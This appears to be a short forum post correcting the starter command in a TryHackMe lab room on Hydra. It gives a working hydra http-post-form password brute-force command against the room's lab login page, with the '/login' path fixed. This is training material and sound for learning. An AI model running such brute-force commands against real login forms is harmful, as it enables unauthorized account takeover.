---
---
when going through the tryhackme room on Hydra, there is an error in the code they give you to start out using it

you're given the following: **hydra -l <username> -P <wordlist> [10.10.121.95](http://10.10.121.95) http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V**

* the above gives you a list of possible passwords rather than the single, correct password.  to get the latter, the word **login** needs to go between the forward slash and the colon before the word **username**
* **hydra -l <username> -P <wordlist> [10.10.121.95](http://10.10.121.95) http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V**
* the exact terms to use in the quotes might depend on the language used in the web form
